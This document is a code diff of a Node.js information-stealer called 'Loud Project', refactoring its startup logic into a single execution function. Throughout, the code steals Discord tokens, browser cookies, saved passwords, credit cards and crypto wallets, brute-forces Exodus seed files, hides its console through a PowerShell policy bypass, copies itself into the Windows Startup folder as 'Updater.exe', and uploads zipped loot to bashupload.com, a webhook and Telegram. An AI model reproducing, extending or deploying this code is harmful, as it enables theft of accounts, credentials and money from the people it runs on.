@@ -4,20 +4,20 @@ const fs = require("fs");
 const path = require("path");
 const { exec, execSync, spawn } = require("child_process");
 
-hideconsole()
+hideconsole();
+
 const axios = require("axios");
 const glob = require("glob");
 const buf_replace = require("buffer-replace");
-const asar = require("asar");
 const os = require("os");
 const crypto = require("crypto");
 const sqlite3 = require("sqlite3");
-const {Dpapi} = require("@primno/dpapi");
+const { Dpapi } = require("@primno/dpapi");
 const forge = require("node-forge");
 const seco = require("seco-file");
 const FormData = require("form-data");
 const screenshot = require("screenshot-desktop");
-const archiver = require("archiver")
+const archiver = require("archiver");
 const WebSocket = require("ws");
 
 function hideconsole() {
@@ -42,12 +42,11 @@ function hideconsole() {
   fs.writeFileSync(tempfile, powershellScript);
 
   try {
-      execSync(`powershell.exe -ExecutionPolicy Bypass -File "${tempfile}"`, { stdio: 'inherit' });
+    execSync(`powershell.exe -ExecutionPolicy Bypass -File "${tempfile}"`, { stdio: "inherit" });
   } finally {
-      fs.unlinkSync(tempfile);
+    fs.unlinkSync(tempfile);
   }
 }
-
 
 let wbk = `%WEBHOOK%`;
 let token = "%TELEGRAM_BOTTOKEN%";
@@ -59,6 +58,7 @@ let cfg = {
   Persist: "%PERSIST?%",
   Persist: "%BLUESCREEN?%",
 };
+
 const identifier = `LoudLogs_${randomChar(4)}-${randomChar(4)}-${randomChar(4)}-${randomChar(4)}`;
 const rdm = `LoudLogs_${random(10)}`;
 
@@ -76,6 +76,7 @@ const appdata = process.env.APPDATA;
 const LOCAL = process.env.LOCALAPPDATA;
 const gameFiles = [];
 const runningDiscords = [];
+const tokens = [];
 
 const paths = [
   appdata + "\\discord\\",
@@ -140,9 +141,8 @@ const paths = [
   LOCAL + "\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\",
   LOCAL + "\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\",
 ];
-function deobfuscate(texte) {
-  return Buffer.from(texte, "base64").toString();
-}
+
+const geckoPaths = [...getGeckoProfiles(appdata + "\\Mozilla\\Firefox\\Profiles\\", "Firefox"), ...getGeckoProfiles(appdata + "\\Waterfox\\Profiles\\", "Waterfox")];
 
 const walletLocalPaths = {
   Bitcoin: path.join(appdata, deobfuscate("Qml0Y29pbg=="), "wallets"),
@@ -157,26 +157,6 @@ const walletLocalPaths = {
   Guarda: path.join(appdata, deobfuscate("R3VhcmRh"), deobfuscate("TG9jYWwgU3RvcmFnZQ"), deobfuscate("bGV2ZWxkYmI=")),
   Coinomi: path.join(appdata, deobfuscate("Q29pbm9taQ=="), deobfuscate("Q29pbm9taQ=="), deobfuscate("d2FsbGV0cw==")),
 };
-
-if (!fs.existsSync(process.env.TEMP + "\\LoudProject")) fs.mkdirSync(process.env.TEMP + "\\LoudProject");
-fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}`);
-
-(async () => {
-  await closeBrowsers();
-  await takeCreditcards();
-  await takeCheese();
-  await takePizzas();
-  await takeAutofilldata();
-  await saveWallets();
-  await getSpotify();
-  await takeDigital();
-  await getPeperonni();
-  await sendTelegram();
-  await stealTokens();
-  await AllInfos();
-  await exodusDecrypt(allPasswords);
-  add_to_startup();
-})();
 
 function random(length) {
   let result = "";
@@ -204,18 +184,6 @@ function add_to_startup() {
   if (!cfg.Persist) return;
   fs.createReadStream(process.argv0).pipe(fs.createWriteStream(`${process.env.APPDATA.replace("\\", "/")}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`));
 }
-
-fs.readdirSync(LOCAL).forEach((file) => {
-  if (file.includes("cord")) {
-    const pattern = LOCAL + "\\" + file + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js";
-
-    glob.sync(pattern).map((fi) => {
-      gameFiles.push(fi);
-
-      listDiscord();
-    });
-  }
-});
 
 function listDiscord() {
   exec("tasklist", function (err, stdout, stderr) {
@@ -303,7 +271,7 @@ async function saveWallets() {
   for (const [wallet, path] of Object.entries(walletLocalPaths)) {
     if (!fs.existsSync(path)) continue;
     if (!fs.existsSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets`)) fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets`);
-    await zipResult(path, process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets\\${wallet}.zip`)
+    await zipResult(path, process.env.TEMP + `\\LoudProject\\${rdm}\\Wallets\\${wallet}.zip`);
   }
 }
 
@@ -311,10 +279,10 @@ async function exodusDecrypt(passwords) {
   const seedpath = appdata + "\\Exodus\\exodus.wallet\\seed.seco";
   if (!fs.existsSync(seedpath)) return;
   try {
-    let ExodusSaved = path.join(seedpath, "..")
-    let zipUrl = await zipResult(ExodusSaved, ExodusSaved + ".zip")
+    let ExodusSaved = path.join(seedpath, "..");
+    let zipUrl = await zipResult(ExodusSaved, ExodusSaved + ".zip");
     decryptFileSeco(seedpath, passwords, zipUrl);
-  } catch (e){}
+  } catch (e) {}
 }
 
 async function decryptFileSeco(filename, passwords, zipUrl) {
@@ -333,8 +301,8 @@ async function decryptFileSeco(filename, passwords, zipUrl) {
   }
 
   if (!final) return;
-  let ExodusURL = await upload(zipUrl) 
-  
+  let ExodusURL = await upload(zipUrl);
+
   axios.post(`${wbk}`, { text: `👀 Loud Project | Exodus Bruteforce\n\n🔑 Password: ${final}` }).catch(() => null);
   axios
     .post(wbk, {
@@ -361,27 +329,9 @@ function decryptExodus(data, phrase) {
   try {
     seco.decryptData(data, phrase);
     return phrase;
-  } catch(e) {
+  } catch (e) {
     return "";
   }
-}
-
-async function packAsar(inputDir, outputFilePath) {
-  try {
-    await asar.createPackage(inputDir, outputFilePath);
-
-    if (fs.existsSync(inputDir) && fs.existsSync(outputFilePath)) {
-      fs.rmSync(inputDir, {
-        recursive: true,
-      });
-    }
-  } catch {}
-}
-
-function unpackAsar(asarFilePath, outputDir) {
-  try {
-    asar.extractAll(asarFilePath, outputDir);
-  } catch {}
 }
 
 async function screenShot() {
@@ -408,8 +358,6 @@ async function sendTelegram() {
     .catch(() => null);
 }
 
-const tokens = [];
-
 async function AllInfos() {
   if (!fs.readdirSync(process.env.TEMP + `\\LoudProject\\${rdm}`).length) return;
 
@@ -431,7 +379,7 @@ async function AllInfos() {
     }
   }
 
-  let path = await zipResult(process.env.TEMP + `\\LoudProject\\${rdm}`, process.env.TEMP + `\\LoudProject\\${rdm}.zip`)
+  let path = await zipResult(process.env.TEMP + `\\LoudProject\\${rdm}`, process.env.TEMP + `\\LoudProject\\${rdm}.zip`);
   const linked = await upload(path).catch(() => null);
 
   const cpu = os.cpus()[0].model;
@@ -1198,7 +1146,7 @@ async function getCheese(fakePath) {
   })();
 
   if (!browserGuess) return;
-  cookiesBrowserUsed.add(browserGuess)
+  cookiesBrowserUsed.add(browserGuess);
   const BROWSERS = {
     chrome: {
       bin: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
@@ -1217,14 +1165,7 @@ async function getCheese(fakePath) {
   const tempProfile = path.join(process.env.TEMP, `temp-profile-${browserGuess}-${randomChar(8)}`);
   if (!fs.existsSync(tempProfile)) fs.mkdirSync(tempProfile);
 
-  const proc = spawn(browser.bin, [
-    "--remote-debugging-port=9222",
-    `--user-data-dir=${tempProfile}`,
-    "--no-first-run",
-    "--headless=new",
-    "--disable-extensions",
-    "--disable-gpu",
-  ], {
+  const proc = spawn(browser.bin, ["--remote-debugging-port=9222", `--user-data-dir=${tempProfile}`, "--no-first-run", "--headless=new", "--disable-extensions", "--disable-gpu"], {
     detached: true,
     stdio: "ignore",
   });
@@ -1256,10 +1197,10 @@ async function getCheese(fakePath) {
     try {
       process.kill(-proc.pid);
     } catch {}
-    await closeBrowsers()
-    try{
-    fs.rmSync(tempProfile, { recursive: true, force: true });
-    }catch{}
+    await closeBrowsers();
+    try {
+      fs.rmSync(tempProfile, { recursive: true, force: true });
+    } catch {}
   }
 }
 
@@ -1276,7 +1217,6 @@ function getGeckoProfiles(path) {
   }
 }
 
-const geckoPaths = [...getGeckoProfiles(appdata + "\\Mozilla\\Firefox\\Profiles\\", "Firefox"), ...getGeckoProfiles(appdata + "\\Waterfox\\Profiles\\", "Waterfox")];
 async function getFirefoxCookies() {
   let cookies = "";
 
@@ -1691,34 +1631,33 @@ async function takeBots(token) {
 }
 
 async function uploadFile(filePath) {
-    const url = "https://bashupload.com/";
-  
-    const formData = new FormData();
-    formData.append("file_1", fs.createReadStream(filePath));
+  const url = "https://bashupload.com/";
 
-    try {
-        const response = await axios.post(url, formData, {
-            maxContentLength: Infinity,
-            maxBodyLength: Infinity,
-            headers: {
-                ...formData.getHeaders(),
-            },
-        });
+  const formData = new FormData();
+  formData.append("file_1", fs.createReadStream(filePath));
 
-        if (response.status === 200 && response.data) {
-            const match = response.data.match(/https:\/\/bashupload\.com\/[^\/]+\/([^\/\s]+\.\w+)/);
-            if (match && match[0]) {
-                return match[0]+"?download=1";
-            } else {
-                return null;
-            }
-        } else {
-            return null;
-        }
-    } catch (error) {
-        console.log(error)
+  try {
+    const response = await axios.post(url, formData, {
+      maxContentLength: Infinity,
+      maxBodyLength: Infinity,
+      headers: {
+        ...formData.getHeaders(),
+      },
+    });
+
+    if (response.status === 200 && response.data) {
+      const match = response.data.match(/https:\/\/bashupload\.com\/[^\/]+\/([^\/\s]+\.\w+)/);
+      if (match && match[0]) {
+        return match[0] + "?download=1";
+      } else {
         return null;
+      }
+    } else {
+      return null;
     }
+  } catch (error) {
+    return null;
+  }
 }
 
 async function upload(filePath) {
@@ -1734,12 +1673,11 @@ async function upload(filePath) {
     });
     return response.data.download_url;
   } catch (error) {
-    console.log(error)
-    let link = await uploadFile(filePath)
+    console.log(error);
+    let link = await uploadFile(filePath);
     return link;
   }
 }
-
 
 async function stealTokens() {
   for (let path of paths) {
@@ -1913,6 +1851,10 @@ const badges = {
     Rare: true,
   },
 };
+
+function deobfuscate(texte) {
+  return Buffer.from(texte, "base64").toString();
+}
 
 async function getRelationships(token) {
   const json = await axios
@@ -2105,21 +2047,53 @@ async function getIp() {
   return ip?.data || "Unknown";
 }
 
-
 async function zipResult(basepath, savepath) {
-    const archive = archiver("zip", { zlib: { level: 9 } });
-    const stream = fs.createWriteStream(savepath);
-    return new Promise((resolve, reject) => {
-      try {
-        archive
-          .directory(basepath + "\\", false)
-          .on("error", (err) => reject(err))
-          .pipe(stream);
-  
-        stream.on("close", () => resolve(savepath));
-        archive.finalize().then(() => {});
-      } catch {}
-    });
-  }
+  const archive = archiver("zip", { zlib: { level: 9 } });
+  const stream = fs.createWriteStream(savepath);
+  return new Promise((resolve, reject) => {
+    try {
+      archive
+        .directory(basepath + "\\", false)
+        .on("error", (err) => reject(err))
+        .pipe(stream);
+
+      stream.on("close", () => resolve(savepath));
+      archive.finalize().then(() => {});
+    } catch {}
+  });
+}
+
+async function ExecutionFloat(params) {
+  if (!fs.existsSync(process.env.TEMP + "\\LoudProject")) fs.mkdirSync(process.env.TEMP + "\\LoudProject");
+  fs.mkdirSync(process.env.TEMP + `\\LoudProject\\${rdm}`);
+
+  await closeBrowsers();
+  await takeCreditcards();
+  await takeCheese();
+  await takePizzas();
+  await takeAutofilldata();
+  await saveWallets();
+  await getSpotify();
+  await takeDigital();
+  await getPeperonni();
+  await sendTelegram();
+  await stealTokens();
+  await AllInfos();
+  await exodusDecrypt(allPasswords);
+  add_to_startup();
+  fs.readdirSync(LOCAL).forEach((file) => {
+    if (file.includes("cord")) {
+      const pattern = LOCAL + "\\" + file + "\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js";
+
+      glob.sync(pattern).map((fi) => {
+        gameFiles.push(fi);
+
+        listDiscord();
+      });
+    }
+  });
+}
+
+ExecutionFloat();
 
 process.on("uncaughtException", (err) => console.log(err)).on("unhandledRejection", (err) => console.log(err));
